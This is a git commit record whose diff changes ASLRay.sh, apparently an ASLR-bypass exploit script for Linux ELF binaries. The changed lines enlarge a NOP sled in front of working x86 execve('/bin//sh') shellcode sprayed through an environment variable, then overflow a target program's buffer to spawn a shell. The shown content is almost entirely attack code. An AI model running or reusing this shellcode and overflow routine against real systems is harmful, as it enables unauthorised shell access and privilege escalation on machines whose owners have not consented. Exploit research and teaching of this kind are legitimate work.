ce232695d1e38faa02d48cc753ef5ade9a00561b
Maksym Zaitsev <cryptolok@protonmail.com>
2017-10-16 15:15:36 +0200

    x32 NOP sled increase

--- ASLRay.sh
+++ ASLRay.sh
@@ -40,7 +40,7 @@ then
 	then
 		echo 'ELF IS 32-BIT'
 		echo 'SPRAYING NOPSLED AND SHELLCODE...'
-		export SHELLCODE=$(for i in {1..9999}; do echo -ne '\x90';done)$(echo -ne '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80')
+		export SHELLCODE=$(for i in {1..99999}; do echo -ne '\x90';done)$(echo -ne '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80')
 		echo 'EXPLOITING...'
 		$FILE $(for i in `seq 1 $BUFFER`;do echo -n 'x';done)$(echo -n 'yyyy')$(echo -n 'zzzz')$(echo -n 'yyyy')
 		echo 'IF NO SHELL - RETRY OR INCREASE NOPSLED'
